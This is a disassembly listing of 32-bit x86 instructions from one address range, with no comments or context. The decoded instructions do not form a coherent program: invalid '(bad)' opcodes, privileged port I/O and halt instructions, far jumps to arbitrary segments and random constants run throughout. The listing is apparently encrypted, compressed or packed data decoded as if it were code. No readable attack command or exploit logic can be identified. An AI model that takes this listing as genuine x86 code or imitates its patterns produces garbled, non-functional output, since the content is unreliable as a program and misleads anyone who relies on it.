  40f8a3:	xchg   edx,edx
  40f8a5:	push   ebx
  40f8a6:	shl    BYTE PTR [ebp+0x76],1
  40f8a9:	scas   al,BYTE PTR es:[edi]
  40f8aa:	ins    BYTE PTR es:[edi],dx
  40f8ab:	(bad)  
  40f8ac:	inc    ecx
  40f8ad:	mov    edi,0x16e7249c
  40f8b2:	xchg   esp,eax
  40f8b3:	and    ecx,DWORD PTR [esi+0x9f5b5c8]
  40f8b9:	call   0xfcb4:0x28417e70
  40f8c0:	sub    eax,0x797646b9
  40f8c5:	in     eax,0x53
  40f8c7:	dec    eax
  40f8c8:	cmp    dl,BYTE PTR [esi+0x6a]
  40f8cb:	icebp  
  40f8cc:	mov    cl,0x57
  40f8ce:	and    esi,0x49
  40f8d1:	js     0x40f855
  40f8d3:	lea    eax,[eax+0x44b829e2]
  40f8d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8da:	imul   BYTE PTR [edi]
  40f8dc:	(bad)  
  40f8dd:	cdq    
  40f8de:	sub    ah,al
  40f8e0:	push   0x40
  40f8e2:	cli    
  40f8e3:	jecxz  0x40f899
  40f8e5:	xor    ch,BYTE PTR [edi]
  40f8e7:	lock or bl,BYTE PTR [eax+0x56]
  40f8eb:	mov    cl,0xed
  40f8ed:	jge    0x40f87b
  40f8ef:	(bad)  
  40f8f1:	ds mov ebx,0x8243ec7c
  40f8f7:	aad    0xfe
  40f8f9:	add    al,0x9b
  40f8fb:	sahf   
  40f8fc:	gs push cs
  40f8fe:	mov    BYTE PTR [edx],dl
  40f900:	mov    ebx,0x82d45e0f
  40f905:	jmp    0xe5692de1
  40f90a:	jne    0x40f8c2
  40f90c:	inc    esi
  40f90d:	xchg   edx,eax
  40f90e:	sbb    al,0xee
  40f910:	out    dx,eax
  40f911:	xor    dl,dl
  40f913:	test   BYTE PTR [ebp-0x3a],0x2d
  40f917:	repz and bl,BYTE PTR [esi+0x1a172229]
  40f91e:	lds    ebx,FWORD PTR [edi+0x5784e9ed]
  40f924:	das    
  40f925:	xchg   DWORD PTR [edi+0x7c],edx
  40f928:	ret    
  40f929:	fldcw  WORD PTR [edi-0x11]
  40f92c:	push   esp
  40f92d:	adc    al,0x8a
  40f92f:	in     al,dx
  40f930:	add    ch,BYTE PTR [esi+0x5d]
  40f933:	push   ebx
  40f934:	dec    ebp
  40f935:	mov    esi,0x48bf71d6
  40f93a:	lods   al,BYTE PTR ds:[esi]
  40f93b:	cmp    dh,BYTE PTR [ecx+ebp*4+0x60723623]
  40f942:	jae    0x40f9c2
  40f944:	cmp    bh,BYTE PTR [edx+0x14fe8060]
  40f94a:	je     0x40f9bc
  40f94c:	iret   
  40f94d:	std    
  40f94e:	int3   
  40f94f:	stos   BYTE PTR es:[edi],al
  40f950:	(bad)  
  40f951:	mov    eax,0x1447b7a3
  40f956:	div    WORD PTR [ecx]
  40f959:	xchg   edx,eax
  40f95a:	les    esi,FWORD PTR [esp+edx*4-0x33ac8027]
  40f961:	push   esi
  40f962:	maskmovq mm6,(bad)
  40f963:	div    DWORD PTR [ebx+eax*4-0x23]
  40f967:	test   bh,0x59
  40f96a:	mov    eax,ds:0x3d4c8368
  40f96f:	hlt    
  40f970:	into   
  40f971:	dec    edi
  40f972:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f973:	jmp    0x40f95c
  40f975:	mov    ds,WORD PTR [edx]
  40f977:	retf   
  40f978:	aad    0x91
  40f97a:	adc    ebx,ebx
  40f97c:	add    BYTE PTR [esi+0x7],bl
  40f97f:	sbb    DWORD PTR [edi],eax
  40f981:	and    BYTE PTR [ebx+0x4f],dh
  40f984:	std    
  40f985:	inc    ecx
  40f986:	or     eax,0x3f87a06e
  40f98b:	frstor [edi-0x71be5ad4]
  40f991:	std    
  40f992:	pop    ebp
  40f993:	clc    
  40f994:	sub    eax,0x8100d2d8
  40f999:	dec    edi
  40f99a:	inc    edx
  40f99b:	aam    0xef
  40f99d:	adc    edx,DWORD PTR [ecx+0x7b]
  40f9a0:	and    DWORD PTR [eax],eax
  40f9a2:	or     al,0x42
  40f9a4:	loop   0x40f9ce
  40f9a6:	jns    0x40f94c
  40f9a8:	repz pushf 
  40f9aa:	mov    bl,0x9d
  40f9ac:	xor    ch,0xe9
  40f9af:	retf   
  40f9b0:	leave  
  40f9b1:	fcmovbe st,st(7)
  40f9b3:	fisttp QWORD PTR [esi+0x14f782c7]
  40f9b9:	test   BYTE PTR [edx+0x64],ch
  40f9bc:	inc    ebp
  40f9bd:	adc    eax,0x46d770c0
  40f9c2:	xchg   edx,eax
  40f9c3:	outs   dx,BYTE PTR es:[esi]
  40f9c5:	mov    esp,0x5cc854f4
  40f9ca:	cmp    al,0x81
  40f9cc:	mov    dl,0xc0
  40f9ce:	and    dh,BYTE PTR [edx]
  40f9d0:	addr16 int3 
  40f9d2:	loopne 0x40f9e0
  40f9d4:	and    eax,0x81458726
  40f9d9:	out    dx,eax
  40f9da:	jle    0x40f9cb
  40f9dc:	(bad)  
  40f9dd:	push   eax
  40f9de:	xor    DWORD PTR [edi],esp
  40f9e0:	inc    esi
  40f9e1:	jecxz  0x40f99d
  40f9e3:	add    esp,0x67d4b2df
  40f9e9:	jns    0x40fa6a
  40f9eb:	dec    edx
  40f9ec:	jle    0x40f99c
  40f9ee:	cdq    
  40f9ef:	cmp    esi,edx
  40f9f1:	xchg   esi,eax
  40f9f2:	xor    DWORD PTR [eax+0x5a],0xe4e1b7ae
  40f9f9:	leave  
  40f9fa:	test   al,0x4
  40f9fc:	add    eax,0xd6b0d8ee
  40fa01:	(bad)  
  40fa02:	scas   al,BYTE PTR es:[edi]
  40fa03:	mov    edx,0xf7084cf5
  40fa08:	mov    bh,0xa7
  40fa0a:	(bad)  
  40fa0b:	lahf   
  40fa0c:	pop    ebp
  40fa0d:	push   0xf026ce57
  40fa12:	test   DWORD PTR [ebx],ecx
  40fa14:	jge    0x40fa77
  40fa16:	fnstenv [ecx-0x60acc6e]
  40fa1c:	adc    al,0xb5
  40fa1e:	jge    0x40f9b9
  40fa20:	icebp  
  40fa21:	mov    ch,0xee
  40fa23:	xor    dl,BYTE PTR [esi+0x54f72c0]
  40fa29:	popf   
  40fa2a:	push   ebx
  40fa2b:	cmp    BYTE PTR [edi-0x226ce657],bh
  40fa31:	add    edi,DWORD PTR [edi+0x12]
  40fa34:	les    ecx,FWORD PTR [ecx+ecx*8+0x1d]
  40fa38:	jp     0x40fa1e
  40fa3a:	out    0x97,al
  40fa3c:	push   ecx
  40fa3d:	pusha  
  40fa3e:	pop    es
  40fa3f:	dec    ebx
  40fa40:	cmp    eax,0xc326c1e9
  40fa45:	fimul  WORD PTR [edx]
  40fa47:	sar    DWORD PTR [esi],1
  40fa49:	ins    DWORD PTR es:[edi],dx
  40fa4a:	bts    DWORD PTR [eax+0xd],esi
  40fa4e:	out    dx,al
  40fa4f:	jo     0x40f9d2
  40fa51:	jnp    0x40fa52
  40fa53:	add    bl,BYTE PTR [edx-0x76]
  40fa56:	sub    BYTE PTR [edi-0x6661c28],bl
  40fa5c:	jo     0x40fa4d
  40fa5e:	push   ebx
  40fa5f:	jl     0x40fa24
  40fa61:	adc    bl,dl
  40fa63:	pop    ss
  40fa64:	test   DWORD PTR [edi+0x74],0x9d12d6ca
  40fa6b:	lea    ebx,[ebp+0x5f]
  40fa6e:	push   ds
  40fa6f:	test   BYTE PTR [eax*8+0x6e23264f],dh
  40fa76:	sub    DWORD PTR [esi],0xffffff9e
  40fa79:	jecxz  0x40fa89
  40fa7b:	sub    al,0xe4
  40fa7d:	ins    BYTE PTR es:[edi],dx
  40fa7e:	sub    BYTE PTR [edx],bh
  40fa80:	arpl   WORD PTR [ebx+0x508ceb72],ax
  40fa86:	add    DWORD PTR [eax+0x7c],eax
  40fa89:	(bad)  
  40fa8a:	retf   0xf490
  40fa8d:	xchg   al,cl
  40fa8f:	add    eax,0x308ae0ee
  40fa94:	cmp    ebp,DWORD PTR [edx+0xf]
  40fa97:	adc    eax,ebx
  40fa99:	pop    ecx
  40fa9a:	dec    esi
  40fa9b:	aas    
  40fa9c:	push   0x4e
  40fa9e:	pushf  
  40fa9f:	or     BYTE PTR [ebx+ebp*1+0x28],cl
  40faa3:	repz iret 
  40faa5:	mov    eax,0x8075d9de
  40faaa:	ret    0x92d4
  40faad:	add    ch,BYTE PTR [ecx]
  40faaf:	test   eax,0xeb6c2bd7
  40fab4:	ins    DWORD PTR es:[edi],dx
  40fab5:	cmp    dl,BYTE PTR [edx-0x81b2a8f]
  40fabb:	xchg   ebp,eax
  40fabc:	retf   0xc2af
  40fabf:	leave  
  40fac0:	mov    al,ds:0x7e1d71aa
  40fac5:	jne    0x40fa81
  40fac7:	lahf   
  40fac8:	sbb    DWORD PTR [eax+eax*2-0x37ecf528],esp
  40facf:	imul   esp,DWORD PTR [eax],0x80ef9c09
  40fad5:	jns    0x40fb45
  40fad7:	adc    DWORD PTR [ebx+0x3c9a7dd9],ebx
  40fadd:	stos   BYTE PTR es:[di],al
  40fadf:	cmp    esi,edi
  40fae1:	fs push ebx
  40fae3:	ror    ch,0x4
  40fae6:	retf   
  40fae7:	fs iret 
  40fae9:	nop
  40faea:	inc    ebx
  40faeb:	cmp    DWORD PTR [eax*1+0x17a79e50],edi
  40faf2:	mov    ch,ah
  40faf4:	sbb    dh,BYTE PTR [edi+ebx*2+0x47]
  40faf8:	ret    
  40faf9:	dec    esi
  40fafa:	push   esp
  40fafb:	pusha  
  40fafc:	in     al,0x77
  40fafe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faff:	shl    edx,cl
  40fb01:	cmp    DWORD PTR [eax+0x4d],ebp
  40fb04:	inc    esi
  40fb05:	es sbb al,0xfb
  40fb08:	sub    DWORD PTR [edi],ebp
  40fb0a:	sub    al,0xb8
  40fb0c:	cmp    edx,DWORD PTR [edi+0x19]
  40fb0f:	cdq    
  40fb10:	or     ch,cl
  40fb12:	loopne 0x40fb93
  40fb14:	int    0x12
  40fb16:	aad    0x6c
  40fb18:	inc    ecx
  40fb19:	jno    0x40fb92
  40fb1b:	dec    ebx
  40fb1c:	cmp    DWORD PTR [ebp-0x7a4ca8c5],0xa8257c4e
  40fb26:	jmp    0x5afb:0xebf2af76
  40fb2d:	adc    ebx,esp
  40fb2f:	pop    ds
  40fb30:	call   0x98b4fbef
  40fb35:	xchg   esi,eax
  40fb36:	icebp  
  40fb37:	add    BYTE PTR [ebx+ecx*2],ch
  40fb3a:	popf   
  40fb3b:	ret    0x7493
  40fb3e:	inc    ebp
  40fb3f:	mov    ds:0xaeb3e90a,eax
  40fb44:	inc    ebp
  40fb45:	sub    al,0x9b
  40fb47:	retf   
  40fb48:	mov    BYTE PTR [eax+ebx*1+0x6e],al
  40fb4c:	leave  
  40fb4d:	es int3 
  40fb4f:	rcr    BYTE PTR [ebp+0x271abd18],1
  40fb55:	jmp    0x4b52:0x81f6e18c
  40fb5c:	repz push esi
  40fb5e:	cwde   
  40fb5f:	and    eax,0xc88c6b34
  40fb64:	(bad)  
  40fb66:	sub    DWORD PTR [esi],ebx
  40fb68:	arpl   bx,bx
  40fb6a:	jg     0x40fb8d
  40fb6c:	mov    edi,DWORD PTR [eax+0x703c0ab5]
  40fb72:	jno    0x40fb21
  40fb74:	add    BYTE PTR [ebp+0x2cd7143b],ah
  40fb7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb7b:	inc    eax
  40fb7c:	or     ah,BYTE PTR ds:0x806270fe
  40fb82:	out    0x6e,eax
  40fb84:	mov    bl,0x4d
  40fb86:	cmp    ah,BYTE PTR ds:0x399f43a9
  40fb8c:	ds push ecx
  40fb8e:	gs mov ebx,0x2a9d9dbf
  40fb94:	(bad)  
  40fb95:	push   ebx
  40fb96:	mov    ebx,0x19a9ecb5
  40fb9b:	cmovl  esi,DWORD PTR [ebx+0x1885d847]
  40fba2:	add    edx,DWORD PTR [edi+0x37]
  40fba5:	cdq    
  40fba6:	push   edx
  40fba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fba8:	js     0x40fb34
  40fbaa:	mov    ebp,0x223775b2
  40fbaf:	fst    DWORD PTR [ecx+esi*8-0x14]
  40fbb3:	sub    al,0xcf
  40fbb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbb6:	pop    es
  40fbb7:	add    esp,edx
  40fbb9:	data16 add BYTE PTR [ebx+0x5c1819ec],0xbe
  40fbc1:	mov    edi,0x9156e8f6
  40fbc6:	or     al,0x46
  40fbc8:	xchg   ebx,eax
  40fbc9:	mov    ?,WORD PTR [eax+ebp*8+0x5b980f6]
  40fbd0:	pop    ss
  40fbd1:	aad    0x38
  40fbd3:	push   0x11
  40fbd5:	dec    ebp
  40fbd6:	mov    gs,WORD PTR [eax-0x5538751a]
  40fbdc:	inc    edi
  40fbdd:	and    edx,DWORD PTR [ebp-0x74]
  40fbe0:	push   ds
  40fbe1:	ss pop ds
  40fbe3:	les    esi,FWORD PTR [edx]
  40fbe5:	push   0xffffffff
  40fbe7:	and    DWORD PTR [eax-0x37915b09],0x5b
  40fbee:	repnz das 
  40fbf0:	push   0xffffffbf
  40fbf2:	pop    esi
  40fbf3:	jmp    DWORD PTR [ebx+esi*4]
  40fbf6:	push   edi
  40fbf7:	repz into 
  40fbf9:	mov    ebp,0x41cf7805
  40fbfe:	mov    WORD PTR [eax-0x2bc0e958],?
  40fc04:	loopne 0x40fc77
  40fc06:	cmp    al,0x96
  40fc08:	and    DWORD PTR [esi+ecx*8-0x7797a4b0],edi
  40fc0f:	mov    cl,0xb3
  40fc11:	inc    esp
  40fc12:	inc    esi
  40fc13:	jb     0x40fbdf
  40fc15:	add    BYTE PTR [edi+0x44],dh
  40fc18:	fwait
  40fc19:	jmp    0x40fbd1
  40fc1b:	leave  
  40fc1c:	div    DWORD PTR [ebx+0x9]
  40fc1f:	fwait
  40fc20:	or     DWORD PTR [esi+ebx*4],edi
  40fc23:	jno    0x40fbcc
  40fc25:	sub    eax,0xc3fd9af7
  40fc2a:	push   esp
  40fc2b:	leave  
  40fc2c:	pop    eax
  40fc2d:	adc    edi,DWORD PTR [ebx+edi*2+0x26]
  40fc31:	mov    bh,0x33
  40fc33:	lods   al,BYTE PTR ds:[esi]
  40fc34:	repz sub ecx,edi
  40fc37:	xor    ebx,DWORD PTR [ebp-0x2d]
  40fc3a:	sbb    BYTE PTR [ebp-0x74],dl
  40fc3d:	adc    al,0xbb
  40fc3f:	icebp  
  40fc40:	cmp    DWORD PTR [ecx+0x26],ebx
  40fc43:	inc    ebx
  40fc44:	lods   al,BYTE PTR ds:[esi]
  40fc45:	sbb    BYTE PTR [ebx],0x25
  40fc48:	and    eax,DWORD PTR [esi]
  40fc4a:	adc    DWORD PTR [ebx-0x54],edi
  40fc4d:	xchg   edi,eax
  40fc4e:	div    edi
  40fc50:	(bad)  
  40fc53:	ret    
  40fc54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc55:	cwde   
  40fc56:	loopne 0x40fc1f
  40fc58:	xchg   ecx,edx
  40fc5a:	test   DWORD PTR [eax+0x64],ebx
  40fc5d:	hlt    
  40fc5e:	out    dx,eax
  40fc5f:	jo     0x40fc35
  40fc61:	loop   0x40fbf6
  40fc63:	xchg   ebp,eax
  40fc64:	fidivr DWORD PTR [ebp-0x4f]
  40fc67:	in     al,dx
  40fc68:	call   0x29e1aaf9
  40fc6d:	mov    ch,BYTE PTR [edi+0x682fd4b0]
  40fc73:	mov    al,ds:0xed0417f9
  40fc78:	stos   DWORD PTR es:[edi],eax
  40fc79:	pop    es
  40fc7a:	daa    
  40fc7b:	popf   
  40fc7c:	jmp    0x20a2:0x6b83d4ac
  40fc83:	jmp    0xd159:0x13200d4a
  40fc8a:	push   ecx
  40fc8b:	loopne 0x40fc80
  40fc8d:	test   eax,0xaa50208d
  40fc92:	inc    edi
  40fc93:	loope  0x40fc76
  40fc95:	jne    0x40fca9
  40fc97:	(bad)  
  40fc98:	js     0x40fce9
  40fc9a:	pop    esp
  40fc9b:	adc    eax,0x3366658
  40fca0:	jmp    0x40fc98
  40fca2:	mov    al,0x16
  40fca4:	dec    ecx
  40fca5:	xchg   ecx,eax
  40fca6:	inc    esp
  40fca7:	out    dx,al
  40fca8:	inc    ecx
  40fca9:	adc    eax,0x41abad57
  40fcae:	fist   DWORD PTR [ecx+0x46]
  40fcb1:	cwde   
  40fcb2:	fcom   DWORD PTR [ecx+edx*8+0x7e]
  40fcb6:	ja     0x40fd16
  40fcb8:	addr16 js 0x40fc78
  40fcbb:	mov    edx,0x9e95afcb
  40fcc0:	scas   eax,DWORD PTR es:[edi]
  40fcc1:	and    BYTE PTR [edi+0x31],0xc
  40fcc5:	mov    ebp,0x418181f0
  40fcca:	lods   eax,DWORD PTR ds:[esi]
  40fccb:	aad    0x50
  40fccd:	xlat   BYTE PTR ds:[ebx]
  40fcce:	pop    edi
  40fccf:	jmp    0x40fc61
  40fcd1:	push   ds
  40fcd2:	popf   
  40fcd3:	and    BYTE PTR [ecx],bh
  40fcd5:	enter  0x1f83,0x50
  40fcd9:	ret    
  40fcda:	or     DWORD PTR [edi-0x39],esi
  40fcdd:	and    DWORD PTR [esi],esp
  40fcdf:	jno    0x40fce3
  40fce1:	mov    dh,BYTE PTR [edi-0x65e9cb85]
  40fce7:	xchg   ebp,eax
  40fce8:	mov    BYTE PTR [esi-0x6d0ba5e4],cl
  40fcee:	shl    edx,cl
  40fcf0:	out    0xbc,al
  40fcf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcf3:	jb     0x40fcab
  40fcf5:	add    dh,dl
  40fcf7:	fsub   DWORD PTR ds:0xadf5898a
  40fcfd:	(bad)  
  40fcfe:	fwait
  40fcff:	adc    esp,DWORD PTR [edi+0x5509257c]
  40fd05:	dec    ebp
  40fd06:	mov    cl,0x64
  40fd08:	leave  
  40fd09:	out    0x5b,eax
  40fd0b:	adc    al,0x3d
  40fd0d:	mov    es,WORD PTR [esi+edx*2]
  40fd10:	sub    ah,BYTE PTR [ebp-0x5dc40f0d]
  40fd16:	fsubrp st(6),st
  40fd18:	cwde   
  40fd19:	sbb    BYTE PTR [ebp+0x44],bh
  40fd1c:	mov    bl,0x4b
  40fd1e:	ins    DWORD PTR es:[edi],dx
  40fd1f:	adc    al,0x68
  40fd21:	sub    eax,DWORD PTR [ecx]
  40fd23:	add    dl,dh
  40fd25:	imul   edx,DWORD PTR [edi+0x6],0x66
  40fd29:	ret    0xd64d
  40fd2c:	je     0x40fd80
  40fd2e:	add    eax,0x4a493671
  40fd33:	ret    
  40fd34:	ja     0x40fd19
  40fd36:	add    DWORD PTR [ebx*1+0x4ffddca7],ebp
  40fd3d:	jecxz  0x40fdbb
  40fd3f:	adc    eax,0xdd545b4d
  40fd44:	imul   DWORD PTR [edx]
  40fd46:	mov    esi,0xc209e906
  40fd4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd4c:	push   esi
  40fd4d:	mov    bl,BYTE PTR [ecx+0x1]
  40fd50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd51:	arpl   si,cx
  40fd53:	mov    WORD PTR [esi],ss
  40fd55:	and    BYTE PTR [esi-0x7e33c93d],dl
  40fd5b:	jl     0xee20b187
  40fd61:	ins    DWORD PTR es:[edi],dx
  40fd62:	mov    al,ds:0x4039fa8d
  40fd67:	mov    ecx,0x98c71825
  40fd6c:	test   BYTE PTR ds:0x2d511ea,cl
  40fd72:	icebp  
  40fd73:	xchg   edx,eax
  40fd74:	push   esi
  40fd75:	es add ch,cl
  40fd78:	loop   0x40fdc4
  40fd7a:	out    dx,eax
  40fd7b:	or     al,0x8b
  40fd7d:	xchg   DWORD PTR [edx+edx*2+0x32],esp
  40fd81:	int3   
  40fd82:	mov    dh,0xf
  40fd84:	push   es
  40fd85:	imul   edi,DWORD PTR [esi+ebx*2-0x77],0x11
  40fd8a:	mov    ah,0x88
  40fd8c:	ins    BYTE PTR es:[edi],dx
  40fd8d:	sub    DWORD PTR [ebx-0x9],esi
  40fd90:	test   DWORD PTR [edx],0xe1595df6
  40fd96:	pop    es
  40fd97:	jecxz  0x40fd1e
  40fd99:	inc    ecx
  40fd9a:	es lods eax,DWORD PTR ss:[esi]
  40fd9d:	or     edi,DWORD PTR [ebx+0x73]
  40fda0:	pop    ebp
  40fda1:	mov    edx,0xc9de93d4
  40fda6:	jecxz  0x40fe24
  40fda8:	enter  0x3bc8,0xe2
  40fdac:	dec    esi
  40fdad:	push   0xa3a6b08b
  40fdb2:	add    ax,0xd472
  40fdb6:	inc    eax
  40fdb7:	push   esp
  40fdb8:	dec    esi
  40fdb9:	mov    ch,0x21
  40fdbb:	cmp    dl,BYTE PTR [ecx+eiz*8-0xbd88620]
  40fdc2:	mov    ecx,0x5fe82fa1
  40fdc7:	imul   edx,DWORD PTR cs:[esi+0x14f49e5a],0x4d
  40fdcf:	fild   WORD PTR [edx]
  40fdd1:	sub    ebp,eax
  40fdd3:	xor    BYTE PTR [ebx],dh
  40fdd5:	ja     0x40fdb3
  40fdd7:	leave  
  40fdd8:	rcr    DWORD PTR [ebx-0x3b],0x1f
  40fddc:	xchg   ebp,eax
  40fddd:	sbb    DWORD PTR [eax+0x47],ebx
  40fde0:	icebp  
  40fde1:	fistp  QWORD PTR [esp+eax*4+0x40253f95]
  40fde8:	sub    DWORD PTR [ebx+ecx*2],ebp
  40fdeb:	push   0xc0ac8e4
  40fdf0:	push   ecx
  40fdf1:	push   edi
  40fdf2:	push   ds
  40fdf3:	fnstsw WORD PTR [esi-0x13ee3203]
  40fdf9:	push   ecx
  40fdfa:	sub    DWORD PTR [ebx-0x42a487aa],esp
  40fe00:	mov    al,ds:0xe1b44e97
  40fe05:	rol    BYTE PTR [edx+0x3c],1
  40fe08:	inc    ebx
  40fe09:	rcl    DWORD PTR [edx],0xec
  40fe0c:	jmp    0xa82f:0x1bd27f69
  40fe13:	mov    cs,WORD PTR [ecx+0x3d]
  40fe16:	fisttp QWORD PTR [eax+0xa0b43a7]
  40fe1c:	push   ss
  40fe1d:	stos   BYTE PTR es:[edi],al
  40fe1e:	mov    eax,0xf0ecc86c
  40fe23:	xor    ch,cl
  40fe25:	bound  ebp,QWORD PTR [ebp+esi*8+0x60]
  40fe29:	std    
  40fe2a:	ret    
  40fe2b:	int    0x25
  40fe2d:	sub    eax,0x26629e66
  40fe32:	jmp    0x40fea4
  40fe34:	mov    ah,0xb
  40fe36:	mov    al,ds:0x5299b8e
  40fe3b:	(bad)  
  40fe3c:	mov    dl,0x8f
  40fe3e:	mov    esi,0x39a2986
  40fe43:	je     0x40fde2
  40fe45:	lods   eax,DWORD PTR ds:[esi]
  40fe46:	lods   eax,DWORD PTR ds:[esi]
  40fe47:	jae    0x40fe2c
  40fe49:	jge    0x40fdd0
  40fe4b:	sbb    bh,bh
  40fe4d:	cdq    
  40fe4e:	mov    cl,0x86
  40fe50:	sub    DWORD PTR [ebx],esi
  40fe52:	lods   eax,DWORD PTR ds:[esi]
  40fe53:	push   esi
  40fe54:	loop   0x40feab
  40fe56:	popa   
  40fe57:	test   al,0xe9
  40fe59:	aas    
  40fe5a:	inc    eax
  40fe5b:	lock adc al,0x24
  40fe5e:	jg     0x40fe26
  40fe60:	xchg   edi,eax
  40fe61:	xchg   edx,eax
  40fe62:	sbb    al,0x41
  40fe64:	outs   dx,BYTE PTR ds:[esi]
  40fe65:	add    eax,0x51d81fca
  40fe6a:	xor    BYTE PTR [edi-0x7f],ah
  40fe6d:	cwde   
  40fe6e:	pop    eax
  40fe6f:	mov    BYTE PTR [ebx+ebp*4+0x6abe7db2],0xa8
  40fe77:	adc    al,0x8b
  40fe79:	lds    esp,FWORD PTR [ebx-0x25]
  40fe7c:	in     eax,0x5a
  40fe7e:	call   0x90401140
  40fe83:	mov    ds:0x53285cdc,al
  40fe88:	in     al,dx
  40fe89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe8a:	sahf   
  40fe8b:	(bad)  
  40fe8c:	push   0x7895a1ea
  40fe91:	int3   
  40fe92:	xchg   ebx,eax
  40fe93:	adc    dl,BYTE PTR ds:0xc3c42c9e
  40fe99:	and    DWORD PTR [esp+eiz*4],eax
  40fe9c:	sub    edx,ebp
  40fe9e:	dec    esp
  40fe9f:	(bad)  
  40fea1:	dec    esp
  40fea2:	cdq    
  40fea3:	and    ah,al
  40fea5:	cmc    
  40fea6:	jmp    0xf0397b3b
  40feab:	sti    
  40feac:	sub    cl,BYTE PTR [ebp-0x4c]
  40feaf:	cdq    
  40feb0:	cld    
  40feb1:	in     eax,0x61
  40feb3:	dec    edi
  40feb4:	inc    ecx
  40feb5:	cwde   
  40feb6:	sbb    al,0x3d
  40feb8:	out    0x2e,eax
  40feba:	pop    ebx
  40febb:	sbb    esi,DWORD PTR [eax]
  40febd:	js     0x40febb
  40febf:	and    al,0x68
  40fec1:	mov    esi,0x28720ce2
  40fec6:	stos   DWORD PTR es:[edi],eax
  40fec7:	mov    dh,0x5e
  40fec9:	dec    ebx
  40feca:	outs   dx,BYTE PTR ds:[esi]
  40fecb:	mov    ecx,0x8ac3d0e1
  40fed0:	and    DWORD PTR [eax+0x2459cbc6],ebx
  40fed6:	push   edi
  40fed7:	adc    al,0xaf
  40fed9:	pop    ss
  40feda:	mov    ch,0x4
  40fedc:	std    
  40fedd:	arpl   WORD PTR [eax-0x2d343f54],bp
  40fee3:	cmp    dh,BYTE PTR cs:[ecx-0x6ef1b567]
  40feea:	scas   eax,DWORD PTR es:[edi]
  40feeb:	les    esi,FWORD PTR [esi]
  40feed:	mov    esp,0x99e0c9ff
  40fef2:	loopne 0x40feb1
  40fef4:	ss mov bl,0xbc
  40fef7:	sti    
  40fef8:	or     eax,0xaa183d3d
  40fefd:	lock or BYTE PTR [ebp+0x72],0x68
  40ff02:	repnz fdivr DWORD PTR [edx-0x3c]
  40ff06:	in     al,0x3f
  40ff08:	adc    eax,0x52f7e06c
  40ff0d:	or     BYTE PTR [ebx-0x725dd620],ch
  40ff13:	jge    0x40fe9d
  40ff15:	cmovno eax,DWORD PTR [eax+0x5a]
  40ff19:	outs   dx,BYTE PTR ds:[esi]
  40ff1a:	xor    DWORD PTR [edi],eax
  40ff1c:	pop    esp
  40ff1d:	loop   0x40ff63
  40ff1f:	push   0xfffffff9
  40ff21:	pop    ds
  40ff22:	pushf  
  40ff23:	pop    eax
  40ff24:	int3   
  40ff25:	xchg   ebp,eax
  40ff26:	adc    DWORD PTR [eax],eax
  40ff28:	jbe    0x2616d02e
  40ff2e:	shl    al,0xef
  40ff31:	mov    edx,0xfbf927ca
  40ff36:	int3   
  40ff37:	dec    edx
  40ff38:	loop   0x40ff58
  40ff3a:	mov    eax,0x69f941c7
  40ff3f:	and    eax,0x4313eedf
  40ff44:	xchg   edi,eax
  40ff45:	lods   al,BYTE PTR ds:[esi]
  40ff46:	cmp    edi,DWORD PTR [ebx-0x46]
  40ff49:	ins    BYTE PTR es:[edi],dx
  40ff4a:	xchg   esi,eax
  40ff4b:	and    edx,DWORD PTR [edi-0x2ddd1c]
  40ff51:	or     al,0x20
  40ff53:	into   
  40ff54:	dec    esp
  40ff55:	mov    al,ds:0x70b01df9
  40ff5a:	lods   eax,DWORD PTR ds:[esi]
  40ff5b:	(bad)  
  40ff5c:	ins    BYTE PTR es:[edi],dx
  40ff5d:	outs   dx,DWORD PTR ds:[esi]
  40ff5e:	icebp  
  40ff5f:	jle    0x40fee9
  40ff61:	xor    eax,edx
  40ff63:	xchg   ebx,eax
  40ff64:	sbb    BYTE PTR [esi],al
  40ff66:	xor    eax,DWORD PTR [eax]
  40ff68:	jl     0x40ffa5
  40ff6a:	fisubr DWORD PTR [ebp-0x65]
  40ff6d:	adc    BYTE PTR [ecx+esi*1+0x636f75f],cl
  40ff74:	cmp    DWORD PTR [edi],ebx
  40ff76:	and    BYTE PTR [ebx],bl
  40ff78:	sub    DWORD PTR [edi],0xf0dcc907
  40ff7e:	ret    
  40ff7f:	xor    ch,cl
  40ff81:	mov    BYTE PTR [edi-0x29],ch
  40ff84:	sbb    BYTE PTR [eax],cl
  40ff86:	imul   esp,DWORD PTR ds:0x3fc2db21,0xee75e7b
  40ff90:	jne    0x40ffc3
  40ff92:	sub    bh,bh
  40ff94:	push   eax
  40ff95:	dec    eax
  40ff96:	jo     0x40ffb7
  40ff98:	pop    ecx
  40ff99:	mov    DWORD PTR [ebx+0x36],edx
  40ff9c:	mov    WORD PTR [edx+0x40],cs
  40ff9f:	xchg   BYTE PTR [ebp-0x5],bh
  40ffa2:	shr    DWORD PTR [edi-0x49],cl
  40ffa5:	jge    0x40ff89
  40ffa7:	adc    al,BYTE PTR [edx-0x361b6abc]
  40ffad:	cmp    BYTE PTR [esi+0x675bf7e1],0x66
  40ffb4:	dec    ebx
  40ffb5:	inc    esi
  40ffb6:	adc    eax,0x2cbccb06
  40ffbb:	ja     0x40ff68
  40ffbd:	in     eax,0xab
  40ffbf:	nop
  40ffc0:	mov    eax,ds:0x90e04474
  40ffc5:	push   es
  40ffc6:	jmp    0x550736e9
  40ffcb:	ins    DWORD PTR es:[edi],dx
  40ffcc:	jg     0x40ff8f
  40ffce:	jle    0x40ff81
  40ffd0:	mov    WORD PTR [eiz*2+0x62e5f89c],cs
  40ffd7:	mov    DWORD PTR [edi-0x13],ebp
  40ffda:	fisub  DWORD PTR [esi+ecx*8-0x42]
  40ffde:	mov    eax,ds:0xaad956e0
  40ffe3:	and    ah,BYTE PTR [edi+0x2b]
  40ffe6:	ins    DWORD PTR es:[edi],dx
  40ffe7:	test   DWORD PTR [esi+0xe],esp
